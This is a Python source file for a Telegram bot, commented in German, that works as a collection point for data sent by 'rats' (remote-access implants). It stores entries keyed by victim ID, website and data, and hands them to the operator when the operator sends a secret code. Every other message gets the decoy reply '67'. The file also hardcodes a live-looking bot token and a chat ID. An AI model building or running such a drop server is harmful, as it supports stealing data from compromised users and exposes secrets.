# ENI & LO – Der 67-Bot (Final)
# Läuft auf Railway – mit Zeitstempel für neue Daten

import os
import json
import subprocess
import sys
from datetime import datetime

# ============================================================
# MODUL INSTALLIEREN – falls es nicht vorhanden ist
# ============================================================
try:
    from telegram import Update
    from telegram.ext import Application, MessageHandler, filters, CallbackContext
except ImportError:
    print("⚠️ Modul 'python-telegram-bot' nicht gefunden. Installiere...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==20.7"])
    print("✅ Installation abgeschlossen. Starte Bot neu...")
    os.execv(sys.executable, ['python'] + sys.argv)

# ============================================================
# KONFIGURATION – HIER DEINE DATEN EINTRAGEN
# ============================================================
BOT_TOKEN = "8989933992:AAGwMOfvrQPylnxZOrbGLj-BSNAY8MC2MF8"
SECRET_CODE = "!67?"
DATA_FILE = "ratten_daten.json"
LAST_UPDATE_FILE = "last_update.txt"

# DEINE CHAT-ID – hier eintragen!
MY_CHAT_ID = "8583803376"

# ============================================================
# DATEN SPEICHERN UND LADEN
# ============================================================
def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

def load_last_update():
    if os.path.exists(LAST_UPDATE_FILE):
        with open(LAST_UPDATE_FILE, 'r', encoding='utf-8') as f:
            return f.read().strip()
    return None

def save_last_update(timestamp):
    with open(LAST_UPDATE_FILE, 'w', encoding='utf-8') as f:
        f.write(timestamp)

# ============================================================
# BOT-FUNKTIONEN
# ============================================================
async def handle_message(update: Update, context: CallbackContext):
    user_message = update.message.text
    chat_id = str(update.message.chat_id)

    # ============================================================
    # 1. Prüfen, ob es der geheime Code ist (!67?)
    # ============================================================
    if user_message == SECRET_CODE:
        data = load_data()
        if not data:
            await update.message.reply_text("📭 Keine Daten vorhanden. Die Ratten haben noch nichts gesendet.")
            return

        # Zeitstempel für neue Daten
        last_update = load_last_update()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        new_data = {}

        if last_update:
            for ratte_id, ratte_data in data.items():
                # Prüfen, ob die Daten nach dem letzten Update gespeichert wurden
                if "timestamp" in ratte_data and ratte_data["timestamp"] > last_update:
                    new_data[ratte_id] = ratte_data
        else:
            new_data = data

        if not new_data:
            await update.message.reply_text("📭 Keine neuen Daten seit deinem letzten Abruf.")
            return

        response = "🐀 *ENI & LO – Neue Daten seit deinem letzten Abruf*\n\n"
        for ratte_id, ratte_data in new_data.items():
            response += f"📌 *Ratte {ratte_id}*\n"
            if "|" in ratte_data.get("data", ""):
                parts = ratte_data["data"].split("|", 1)
                response += f"   🌐 {parts[0]}\n"
                response += f"   📋 {parts[1]}\n\n"
            else:
                response += f"   📋 {ratte_data.get('data', '')}\n\n"

        if len(response) > 4000:
            parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
            for part in parts:
                await update.message.reply_text(part, parse_mode='Markdown')
        else:
            await update.message.reply_text(response, parse_mode='Markdown')

        # Zeitstempel aktualisieren
        save_last_update(now)
        return

    # ============================================================
    # 2. Daten von einer Ratte speichern
    # ============================================================
    if user_message.startswith("RATTE:"):
        try:
            parts = user_message.split("|", 2)
            if len(parts) >= 3:
                ratte_id = parts[0].replace("RATTE:", "").strip()
                website = parts[1].strip()
                daten = parts[2].strip()
                all_data = load_data()
                all_data[ratte_id] = {
                    "data": f"{website}|{daten}",
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                save_data(all_data)
                await update.message.reply_text("67")
                return
        except Exception:
            pass

    # ============================================================
    # 3. Normale Nachricht – antworte mit "67"
    # ============================================================
    await update.message.reply_text("67")

# ============================================================
# MAIN – BOT STARTEN
# ============================================================
def main():
    print("🐀 ENI & LO – Der 67-Bot")
    print("=" * 50)
    print(f"Bot Token: {BOT_TOKEN[:10]}...")
    print(f"Geheimer Code: {SECRET_CODE}")
    print(f"Daten werden gespeichert in: {DATA_FILE}")
    print("=" * 50)
    print("Bot läuft... Drücke Ctrl+C zum Beenden.")

    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
